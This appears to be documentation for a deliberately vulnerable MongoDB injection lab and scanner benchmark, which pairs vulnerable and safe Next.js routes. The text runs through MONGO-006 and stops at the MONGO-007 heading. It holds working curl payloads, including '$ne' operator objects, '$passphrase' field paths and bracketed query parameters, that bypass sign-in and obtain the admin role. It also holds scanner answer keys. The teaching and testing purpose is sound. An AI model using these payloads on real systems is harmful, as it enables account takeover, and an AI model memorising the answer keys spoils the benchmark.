# Module: MongoDB query injection (CWE-943, CWE-915)

A MongoDB query is a document. A request value that becomes a part of that document can add an operator, a field path, JavaScript or a pattern. 27 vulnerable routes are paired with 37 safe routes. Many safe routes are near twins of a vulnerable route, so a tool cannot pass by always reporting or never reporting. A second batch of 30 vulnerable and 34 safe routes, under neutral names, is in [workshop.md](workshop.md).

The routes use the native `mongodb` driver. `lib/mongo.cjs` starts one in-memory MongoDB server for each server process with `mongodb-memory-server`, on loopback, with synthetic data. `POST /api/lab/reset` seeds it again when it is running.

**Neutral source.** Route names, field names and source comments do not say which side a route is on. This is different from the other modules: there are no `safe/` and `unsafe/` folders and no sink comments. This page, `lib/catalog.json` and the generated expectations hold the answers.

**How the answers were made.** Every expected result was written from the source of the route before any scanner ran on it. The tests then show the result at run time.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [MONGO-001 · Operator injection in a sign-in body](#mongo-001) | [expected finding](#mongo-001-agent) | [guide](#mongo-001-student) | [Burp · Postman · curl](#mongo-001-exploit) | [comparison](#mongo-001-safe) | [tests](#mongo-001-tests) |
| [MONGO-002 · Type check without a return](#mongo-002) | [expected finding](#mongo-002-agent) | [guide](#mongo-002-student) | [Burp · Postman · curl](#mongo-002-exploit) | [comparison](#mongo-002-safe) | [tests](#mongo-002-tests) |
| [MONGO-003 · Only top-level operator keys are removed](#mongo-003) | [expected finding](#mongo-003-agent) | [guide](#mongo-003-student) | [Burp · Postman · curl](#mongo-003-exploit) | [comparison](#mongo-003-safe) | [tests](#mongo-003-tests) |
| [MONGO-004 · A different field is checked](#mongo-004) | [expected finding](#mongo-004-agent) | [guide](#mongo-004-student) | [Burp · Postman · curl](#mongo-004-exploit) | [comparison](#mongo-004-safe) | [tests](#mongo-004-tests) |
| [MONGO-005 · Text read as a field path in $expr](#mongo-005) | [expected finding](#mongo-005-agent) | [guide](#mongo-005-student) | [Burp · Postman · curl](#mongo-005-exploit) | [comparison](#mongo-005-safe) | [tests](#mongo-005-tests) |
| [MONGO-006 · Operator injection from bracketed query parameters](#mongo-006) | [expected finding](#mongo-006-agent) | [guide](#mongo-006-student) | [Burp · Postman · curl](#mongo-006-exploit) | [comparison](#mongo-006-safe) | [tests](#mongo-006-tests) |
| [MONGO-007 · ObjectId fallback to the raw value](#mongo-007) | [expected finding](#mongo-007-agent) | [guide](#mongo-007-student) | [Burp · Postman · curl](#mongo-007-exploit) | [comparison](#mongo-007-safe) | [tests](#mongo-007-tests) |
| [MONGO-008 · $where built from request text](#mongo-008) | [expected finding](#mongo-008-agent) | [guide](#mongo-008-student) | [Burp · Postman · curl](#mongo-008-exploit) | [comparison](#mongo-008-safe) | [tests](#mongo-008-tests) |
| [MONGO-009 · $function body built from request text](#mongo-009) | [expected finding](#mongo-009-agent) | [guide](#mongo-009-student) | [Burp · Postman · curl](#mongo-009-exploit) | [comparison](#mongo-009-safe) | [tests](#mongo-009-tests) |
| [MONGO-010 · A parsed JSON filter passed to find](#mongo-010) | [expected finding](#mongo-010-agent) | [guide](#mongo-010-student) | [Burp · Postman · curl](#mongo-010-exploit) | [comparison](#mongo-010-safe) | [tests](#mongo-010-tests) |
| [MONGO-011 · A fixed condition overridden by a spread](#mongo-011) | [expected finding](#mongo-011-agent) | [guide](#mongo-011-student) | [Burp · Postman · curl](#mongo-011-exploit) | [comparison](#mongo-011-safe) | [tests](#mongo-011-tests) |
| [MONGO-012 · A request filter passed to countDocuments](#mongo-012) | [expected finding](#mongo-012-agent) | [guide](#mongo-012-student) | [Burp · Postman · curl](#mongo-012-exploit) | [comparison](#mongo-012-safe) | [tests](#mongo-012-tests) |
| [MONGO-013 · A request object selects the document to update](#mongo-013) | [expected finding](#mongo-013-agent) | [guide](#mongo-013-student) | [Burp · Postman · curl](#mongo-013-exploit) | [comparison](#mongo-013-safe) | [tests](#mongo-013-tests) |
| [MONGO-014 · A spread overrides the owner in a delete](#mongo-014) | [expected finding](#mongo-014-agent) | [guide](#mongo-014-student) | [Burp · Postman · curl](#mongo-014-exploit) | [comparison](#mongo-014-safe) | [tests](#mongo-014-tests) |
| [MONGO-015 · Validation after the query](#mongo-015) | [expected finding](#mongo-015-agent) | [guide](#mongo-015-student) | [Burp · Postman · curl](#mongo-015-exploit) | [comparison](#mongo-015-safe) | [tests](#mongo-015-tests) |
| [MONGO-016 · An aggregation pipeline from the request](#mongo-016) | [expected finding](#mongo-016-agent) | [guide](#mongo-016-student) | [Burp · Postman · curl](#mongo-016-exploit) | [comparison](#mongo-016-safe) | [tests](#mongo-016-tests) |
| [MONGO-017 · A $match stage from the request](#mongo-017) | [expected finding](#mongo-017-agent) | [guide](#mongo-017-student) | [Burp · Postman · curl](#mongo-017-exploit) | [comparison](#mongo-017-safe) | [tests](#mongo-017-tests) |
| [MONGO-018 · A group key named by the request](#mongo-018) | [expected finding](#mongo-018-agent) | [guide](#mongo-018-student) | [Burp · Postman · curl](#mongo-018-exploit) | [comparison](#mongo-018-safe) | [tests](#mongo-018-tests) |
| [MONGO-019 · A request object passed to $set](#mongo-019) | [expected finding](#mongo-019-agent) | [guide](#mongo-019-student) | [Burp · Postman · curl](#mongo-019-exploit) | [comparison](#mongo-019-safe) | [tests](#mongo-019-tests) |
| [MONGO-020 · Removed keys and a dotted path](#mongo-020) | [expected finding](#mongo-020-agent) | [guide](#mongo-020-student) | [Burp · Postman · curl](#mongo-020-exploit) | [comparison](#mongo-020-safe) | [tests](#mongo-020-tests) |
| [MONGO-021 · A complete update document from the request](#mongo-021) | [expected finding](#mongo-021-agent) | [guide](#mongo-021-student) | [Burp · Postman · curl](#mongo-021-exploit) | [comparison](#mongo-021-safe) | [tests](#mongo-021-tests) |
| [MONGO-022 · Text read as a field path in an update pipeline](#mongo-022) | [expected finding](#mongo-022-agent) | [guide](#mongo-022-student) | [Burp · Postman · curl](#mongo-022-exploit) | [comparison](#mongo-022-safe) | [tests](#mongo-022-tests) |
| [MONGO-023 · Request-controlled sort](#mongo-023) | [expected finding](#mongo-023-agent) | [guide](#mongo-023-student) | [Burp · Postman · curl](#mongo-023-exploit) | [comparison](#mongo-023-safe) | [tests](#mongo-023-tests) |
| [MONGO-024 · Request-controlled projection](#mongo-024) | [expected finding](#mongo-024-agent) | [guide](#mongo-024-student) | [Burp · Postman · curl](#mongo-024-exploit) | [comparison](#mongo-024-safe) | [tests](#mongo-024-tests) |
| [MONGO-025 · Request-controlled field name](#mongo-025) | [expected finding](#mongo-025-agent) | [guide](#mongo-025-student) | [Burp · Postman · curl](#mongo-025-exploit) | [comparison](#mongo-025-safe) | [tests](#mongo-025-tests) |
| [MONGO-026 · User text in $regex](#mongo-026) | [expected finding](#mongo-026-agent) | [guide](#mongo-026-student) | [Burp · Postman · curl](#mongo-026-exploit) | [comparison](#mongo-026-safe) | [tests](#mongo-026-tests) |
| [MONGO-027 · Incomplete escape before $regex](#mongo-027) | [expected finding](#mongo-027-agent) | [guide](#mongo-027-student) | [Burp · Postman · curl](#mongo-027-exploit) | [comparison](#mongo-027-safe) | [tests](#mongo-027-tests) |

## Safe cases and why they are tricky

Scanners should report none of these for CWE-943 or CWE-915. The claim is scoped to injection: for example, the directory routes have no access control, and some sign-in routes compare plaintext lab secrets.

| Safe source | Control for | Why it is safe | Wrong reasoning it catches |
| --- | --- | --- | --- |
| `pages/api/mongo/sign-in/kiosk.js` | MONGO-001 | Both values pass through `String()`. An object becomes the text `[object Object]`. | Looking for a type check or a schema and not seeing the coercion |
| `pages/api/mongo/sign-in/branch.js` | MONGO-001 | Each value is the operand of `$eq`. An operand of `$eq` is compared literally, so `{ "$ne": "" }` matches only a stored document of that shape. | Reporting every raw request value in a filter |
| `pages/api/mongo/sign-in/mobile.js` | MONGO-001 | A Zod schema accepts only two strings and removes every other key. The parsed object, not the request body, is the filter. | Reporting a whole parsed object as a filter without reading the schema |
| `pages/api/mongo/sign-in/vendor.js` | MONGO-002 | The same check returns before the query. Only strings reach the filter. | Not telling a check that returns from one that does not |
| `pages/api/mongo/sign-in/gateway.js` | MONGO-003 | `pruneTree` removes such keys at every depth, and the route takes only two named fields. `{ "$ne": "" }` becomes `{}`, which matches no text value. | Not reading how deep the helper goes |
| `pages/api/mongo/sign-in/lobby.js` | MONGO-004 | The same choice is made first, and the check is on the chosen value. | Judging the number of checks and not the value that reaches the query |
| `pages/api/mongo/sign-in/console.js` | MONGO-005 | Each value is wrapped in `$literal`, so it is never read as a field path. | Reporting every request value inside `$expr` |
| `pages/api/mongo/directory/locker.js` | MONGO-006 | The same parser, then `String()` and `Number()`. An object becomes `NaN`, which equals no stored pin. | Reporting every value from the nested parser |
| `pages/api/mongo/directory/desk.js` | MONGO-006 | Uses `req.query` from Next.js, which stays flat: `inviteCode[$ne]` is an unrelated parameter name. A value is a string or an array of strings, so it cannot hold an operator. | Assuming that `req.query` holds nested objects, as in Express with `qs` |
| `pages/api/mongo/articles/shelf.js` | MONGO-006 | A repeated parameter feeds `$in` with an array of strings. The operator is fixed and the values are data. | Reporting any request array in `$in` |
| `pages/api/mongo/articles/item.js` | MONGO-007 | The same parse, and a failure ends the request with status 400. | Treating any `ObjectId` call as enough, or any value that `catch` can reach as raw |
| `pages/api/mongo/articles/topic.js` | MONGO-008 | `JSON.stringify` of a checked string gives one complete JavaScript string literal. A quote stays inside it. | Reporting every template in `$where` |
| `pages/api/mongo/articles/budget.js` | MONGO-008 | The only inserted value is the result of `Number()`. Its text is digits, `NaN` or `Infinity`. | Reporting every template in `$where` |
| `pages/api/mongo/articles/view.js` | MONGO-008 | `$where` is one of two constant strings, chosen by an own key of a constant map. | Reporting a `$where` that depends on the request |
| `pages/api/mongo/articles/range.js` | MONGO-008 | `$expr` with a fixed shape. The only request value is a number. | Reporting every request value inside `$expr` |
| `pages/api/mongo/articles/rank.js` | MONGO-009 | The function body is constant. The value is a checked number and goes in through `args`. | Reporting every `$function` with a request value near it |
| `pages/api/mongo/articles/match.js` | MONGO-010 | The text is also parsed as JSON, but only one property is used, as a string, next to a fixed `published: true`. | Reporting every `JSON.parse` result in a filter |
| `pages/api/mongo/articles/catalogue.js` | MONGO-011 | The same spread, of an object with only two listed fields and only string values. `published` cannot be replaced. | Reporting every spread after a fixed condition |
| `pages/api/mongo/directory/count.js` | MONGO-012 | Two named fields, each the operand of `$eq`. | Reporting request values in a filter without reading `$eq` |
| `pages/api/mongo/bookings/finish.js` | MONGO-013 | The filter names the fixed holder and one reference as a string. | Reporting an update because a request value is in its filter |
| `pages/api/mongo/bookings/discard.js` | MONGO-014 | The holder is fixed and the reference is the operand of `$eq`. | Reporting a delete because a request value is in its filter |
| `pages/api/mongo/bookings/accept.js` | MONGO-015 | The same check stands before the update. | Not reading the order of the check and the query |
| `pages/api/mongo/reports/named.js` | MONGO-016 | The pipeline is one of two constants, chosen by an own key of a constant map. | Reporting a pipeline that depends on the request |
| `pages/api/mongo/reports/overview.js` | MONGO-017 | One field and a string. In `$match` (outside `$expr`) a string is data, even when it starts with `$`. | Treating `$match` like `$expr` |
| `pages/api/mongo/reports/totals.js` | MONGO-018 | The same template. `by` is the matching entry of a constant list, or the default. | Reporting every template in a field path |
| `pages/api/mongo/members/details.js` | MONGO-019 | Two named fields, both strings. | Reporting every request value in `$set` |
| `pages/api/mongo/members/settings.js` | MONGO-019 | The Zod schema removes keys that it does not list, and the parsed object is set. | Reporting a whole object in `$set` without reading the schema |
| `pages/api/mongo/members/options.js` | MONGO-020 | Every key must be in a constant list and every value a string, or the request ends. | Reporting a copied body in `$set` without reading the check |
| `pages/api/mongo/members/entry.js` | MONGO-021 | Accepts the same body shape, reads one value from it and builds its own update document. | Reporting because the body holds `$set` |
| `pages/api/mongo/members/alias.js` | MONGO-022 | A classic update document: `$set` stores the text as it is. | Treating `$set` in a document like `$set` in a pipeline |
| `pages/api/mongo/articles/sorted.js` | MONGO-023 | The sort document is a constant, chosen by an own key of a constant map. | Reporting a sort that depends on the request |
| `pages/api/mongo/directory/contact.js` | MONGO-024 | The names are filtered through a constant list before the projection. | Reporting every computed projection |
| `pages/api/mongo/directory/locate.js` | MONGO-025 | The name must be one of two constants, or the request ends. | Reporting every computed filter key |
| `pages/api/mongo/invites/claim.js` | MONGO-026 | Every character with a meaning in a pattern is escaped first. | Reporting every template in `$regex` |
| `pages/api/mongo/invites/check.js` | MONGO-026 | `RegExp.escape`, built in from Node.js 24, escapes the text. | Not knowing the built-in function |
| `pages/api/mongo/invites/open.js` | MONGO-026 | The text must match a pattern of letters, digits and hyphens before it is used. | Not reading an allow-listed character set as a control |
| `pages/api/mongo/invites/join.js` | MONGO-027 | One `replace` with a global pattern escapes every character that is not a letter or a digit. | Judging by the presence of `replace` |

## Vulnerable cases that look safe

| Vulnerable source | What looks like a control | Why it is not |
| --- | --- | --- |
| `pages/api/mongo/sign-in/partner.js` (MONGO-002) | A `typeof` check on both fields | The `typeof` check sets status 400 and does not return. The query still runs with the object, and the response body holds the result. |
| `pages/api/mongo/sign-in/portal.js` (MONGO-003) | A helper that removes `$` keys | `pruneKeys` in `lib/request-keys.cjs` removes keys that start with `$` from the body itself. The operator is one level lower, inside `passphrase`, and stays. |
| `pages/api/mongo/sign-in/reception.js` (MONGO-004) | A `typeof` check on two fields | The check covers `username` and `passphrase`. When `code` is present the filter uses it instead of `passphrase`, and nothing checked it. |
| `pages/api/mongo/sign-in/terminal.js` (MONGO-005) | A `typeof` check and an `$expr` with a fixed shape | Both values must be strings. Inside `$expr` a string that starts with `$` is a field path, so `$passphrase` is compared with itself and always matches. |
| `pages/api/mongo/articles/entry.js` (MONGO-007) | `new ObjectId` in `try` | When the value is not an ObjectId, the `catch` keeps the raw value. An operator object is exactly such a value. |
| `pages/api/mongo/articles/listing.js` (MONGO-011) | A fixed `published: true` | The fixed `published: true` comes first. The spread body comes later and replaces it, and it can also add `$where`. |
| `pages/api/mongo/bookings/remove.js` (MONGO-014) | A fixed `holder` | The fixed `holder` comes first and the spread body replaces it. |
| `pages/api/mongo/bookings/confirm.js` (MONGO-015) | A `typeof` check that returns | The type check is correct and returns, but it stands after the update. |
| `pages/api/mongo/reports/summary.js` (MONGO-017) | A fixed first `$match` | The first stage keeps published articles only, but the second `$match` is written by the caller. It can test a hidden field and can run `$expr`. |
| `pages/api/mongo/members/preferences.js` (MONGO-020) | `delete` of the protected keys | The route deletes `access`, but `access.role` is a different key, and MongoDB reads it as a path. A report of CWE-943 for the same flow is also correct. |
| `pages/api/mongo/members/nickname.js` (MONGO-022) | A `typeof` check and a fixed filter | The value must be a string. The update is a pipeline (an array), so a string that starts with `$` is a field path and copies a secret into a visible field. |
| `pages/api/mongo/invites/redeem.js` (MONGO-026) | `String()` | `String()` keeps operators out, but the text is a pattern. `.*` matches every code. A slow pattern (CWE-1333) is the same flow. |
| `pages/api/mongo/invites/accept.js` (MONGO-027) | An escape with `replace` | The two `replace` calls take a string, so each escapes the first occurrence only, and they cover only `.` and `*`. Brackets and `+` stay active. The usual probe `.*` is escaped, so it does not show the flaw. |

Shared code: `lib/mongo.cjs` (connection and seed), `lib/query-tree.cjs` (nested query parameters) and `lib/request-keys.cjs` (removal of `$` keys). Not covered: Mongoose and other object mappers, the App Router, change streams, time-series and search stages, `mapReduce`, bulk writes, and MongoDB-compatible services such as Amazon DocumentDB.

**First start.** The first MongoDB request in a fresh checkout downloads the `mongod` binary (MongoDB 8.2.6, about 80 MB). Run the unit suite once to fetch it.

---

<a id="mongo-001"></a>
## MONGO-001 · Operator injection in a sign-in body

<a id="mongo-001-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/sign-in/front-desk.js` |
| Safe control | `pages/api/mongo/sign-in/kiosk.js` |
| Other safe cases | `pages/api/mongo/sign-in/branch.js`, `pages/api/mongo/sign-in/mobile.js` |
| Route | `POST /api/mongo/sign-in/front-desk` vs `/api/mongo/sign-in/kiosk` |
| Flow | JSON body objects → findOne filter values → operator comparison |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-001-student) · [Exploit lab](#mongo-001-exploit) · [Vuln vs protected](#mongo-001-safe) · [Tests](#mongo-001-tests)

<a id="mongo-001-student"></a>
### Student guide

The two values go into the filter as they arrive. A JSON body can send an object, and the server reads `{ "$ne": "" }` as a comparison, not as a value. The check only asks whether the values are truthy. `$gt`, `$in` and `$regex` work the same way.

<a id="mongo-001-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/front-desk -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# authenticated: true with the role admin, without the passphrase

curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/kiosk -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# none of that
```

**Observation that proves exploitation:** `authenticated: true` with the role `admin`, without the passphrase.

<a id="mongo-001-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/sign-in/front-desk.js` | vulnerable | The two values go into the filter as they arrive. A JSON body can send an object, and the server reads `{ "$ne": "" }` as a comparison, not as a value. The check only asks whether the values are truthy. `$gt`, `$in` and `$regex` work the same way. |
| `pages/api/mongo/sign-in/kiosk.js` | protected | Both values pass through `String()`. An object becomes the text `[object Object]`. |
| `pages/api/mongo/sign-in/branch.js` | protected | Each value is the operand of `$eq`. An operand of `$eq` is compared literally, so `{ "$ne": "" }` matches only a stored document of that shape. |
| `pages/api/mongo/sign-in/mobile.js` | protected | A Zod schema accepts only two strings and removes every other key. The parsed object, not the request body, is the filter. |

The control is scoped to this flaw.

<a id="mongo-001-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-002"></a>
## MONGO-002 · Type check without a return

<a id="mongo-002-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/sign-in/partner.js` |
| Safe control | `pages/api/mongo/sign-in/vendor.js` |
| Route | `POST /api/mongo/sign-in/partner` vs `/api/mongo/sign-in/vendor` |
| Flow | JSON body → typeof check that sets a status only → findOne filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-002-student) · [Exploit lab](#mongo-002-exploit) · [Vuln vs protected](#mongo-002-safe) · [Tests](#mongo-002-tests)

<a id="mongo-002-student"></a>
### Student guide

The `typeof` check sets status 400 and does not return. The query still runs with the object, and the response body holds the result.

<a id="mongo-002-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/partner -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# status 400, and a body with authenticated: true and the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/vendor -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# none of that
```

**Observation that proves exploitation:** status 400, and a body with `authenticated: true` and the role `admin`.

<a id="mongo-002-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/sign-in/partner.js` | vulnerable | The `typeof` check sets status 400 and does not return. The query still runs with the object, and the response body holds the result. |
| `pages/api/mongo/sign-in/vendor.js` | protected | The same check returns before the query. Only strings reach the filter. |

The control is scoped to this flaw.

<a id="mongo-002-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-003"></a>
## MONGO-003 · Only top-level operator keys are removed

<a id="mongo-003-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/sign-in/portal.js` |
| Safe control | `pages/api/mongo/sign-in/gateway.js` |
| Route | `POST /api/mongo/sign-in/portal` vs `/api/mongo/sign-in/gateway` |
| Flow | JSON body → pruneKeys (top level only) → nested operator → findOne filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-003-student) · [Exploit lab](#mongo-003-exploit) · [Vuln vs protected](#mongo-003-safe) · [Tests](#mongo-003-tests)

<a id="mongo-003-student"></a>
### Student guide

`pruneKeys` in `lib/request-keys.cjs` removes keys that start with `$` from the body itself. The operator is one level lower, inside `passphrase`, and stays.

<a id="mongo-003-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/portal -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# authenticated: true with the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/gateway -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":{"$ne":""}}'
# none of that
```

**Observation that proves exploitation:** `authenticated: true` with the role `admin`.

<a id="mongo-003-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/sign-in/portal.js` | vulnerable | `pruneKeys` in `lib/request-keys.cjs` removes keys that start with `$` from the body itself. The operator is one level lower, inside `passphrase`, and stays. |
| `pages/api/mongo/sign-in/gateway.js` | protected | `pruneTree` removes such keys at every depth, and the route takes only two named fields. `{ "$ne": "" }` becomes `{}`, which matches no text value. |

The control is scoped to this flaw.

<a id="mongo-003-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-004"></a>
## MONGO-004 · A different field is checked

<a id="mongo-004-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/sign-in/reception.js` |
| Safe control | `pages/api/mongo/sign-in/lobby.js` |
| Route | `POST /api/mongo/sign-in/reception` vs `/api/mongo/sign-in/lobby` |
| Flow | JSON body code → no check → findOne filter (inviteCode) |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-004-student) · [Exploit lab](#mongo-004-exploit) · [Vuln vs protected](#mongo-004-safe) · [Tests](#mongo-004-tests)

<a id="mongo-004-student"></a>
### Student guide

The check covers `username` and `passphrase`. When `code` is present the filter uses it instead of `passphrase`, and nothing checked it.

<a id="mongo-004-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/reception -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":"x","code":{"$ne":""}}'
# authenticated: true with the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/lobby -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":"x","code":{"$ne":""}}'
# none of that
```

**Observation that proves exploitation:** `authenticated: true` with the role `admin`.

<a id="mongo-004-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/sign-in/reception.js` | vulnerable | The check covers `username` and `passphrase`. When `code` is present the filter uses it instead of `passphrase`, and nothing checked it. |
| `pages/api/mongo/sign-in/lobby.js` | protected | The same choice is made first, and the check is on the chosen value. |

The control is scoped to this flaw.

<a id="mongo-004-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-005"></a>
## MONGO-005 · Text read as a field path in $expr

<a id="mongo-005-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/sign-in/terminal.js` |
| Safe control | `pages/api/mongo/sign-in/console.js` |
| Route | `POST /api/mongo/sign-in/terminal` vs `/api/mongo/sign-in/console` |
| Flow | JSON body text → $expr $eq operand → field path |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-005-student) · [Exploit lab](#mongo-005-exploit) · [Vuln vs protected](#mongo-005-safe) · [Tests](#mongo-005-tests)

<a id="mongo-005-student"></a>
### Student guide

Both values must be strings. Inside `$expr` a string that starts with `$` is a field path, so `$passphrase` is compared with itself and always matches.

<a id="mongo-005-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/terminal -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":"$passphrase"}'
# authenticated: true with the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/console -H 'Content-Type: application/json' \
  -d '{"username":"admin","passphrase":"$passphrase"}'
# none of that
```

**Observation that proves exploitation:** `authenticated: true` with the role `admin`.

<a id="mongo-005-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/sign-in/terminal.js` | vulnerable | Both values must be strings. Inside `$expr` a string that starts with `$` is a field path, so `$passphrase` is compared with itself and always matches. |
| `pages/api/mongo/sign-in/console.js` | protected | Each value is wrapped in `$literal`, so it is never read as a field path. |

The control is scoped to this flaw.

<a id="mongo-005-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-006"></a>
## MONGO-006 · Operator injection from bracketed query parameters

<a id="mongo-006-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/directory/badge.js` |
| Safe control | `pages/api/mongo/directory/locker.js` |
| Other safe cases | `pages/api/mongo/directory/desk.js`, `pages/api/mongo/articles/shelf.js` |
| Route | `GET /api/mongo/directory/badge` vs `/api/mongo/directory/locker` |
| Flow | bracketed query parameters → parseQuery (nested objects) → findOne filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-006-student) · [Exploit lab](#mongo-006-exploit) · [Vuln vs protected](#mongo-006-safe) · [Tests](#mongo-006-tests)

<a id="mongo-006-student"></a>
### Student guide

`parseQuery` in `lib/query-tree.cjs` turns `inviteCode[$ne]=x` into `{ inviteCode: { $ne: "x" } }`. A repeated `inviteCode[$in]=…` becomes an `$in` array. The only check is for presence.

<a id="mongo-006-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/directory/badge?username=admin&inviteCode%5B%24ne%5D=x'
# the account of admin without the invitation code

curl -s 'http://127.0.0.1:3000/api/mongo/directory/locker?username=admin&inviteCode%5B%24ne%5D=x'
# none of that
```

**Observation that proves exploitation:** the account of `admin` without the invitation code.

<a id="mongo-006-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/directory/badge.js` | vulnerable | `parseQuery` in `lib/query-tree.cjs` turns `inviteCode[$ne]=x` into `{ inviteCode: { $ne: "x" } }`. A repeated `inviteCode[$in]=…` becomes an `$in` array. The only check is for presence. |
| `pages/api/mongo/directory/locker.js` | protected | The same parser, then `String()` and `Number()`. An object becomes `NaN`, which equals no stored pin. |
| `pages/api/mongo/directory/desk.js` | protected | Uses `req.query` from Next.js, which stays flat: `inviteCode[$ne]` is an unrelated parameter name. A value is a string or an array of strings, so it cannot hold an operator. |
| `pages/api/mongo/articles/shelf.js` | protected | A repeated parameter feeds `$in` with an array of strings. The operator is fixed and the values are data. |

The control is scoped to this flaw.

<a id="mongo-006-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-007"></a>
## MONGO-007 · ObjectId fallback to the raw value

<a id="mongo-007-agent"></a>
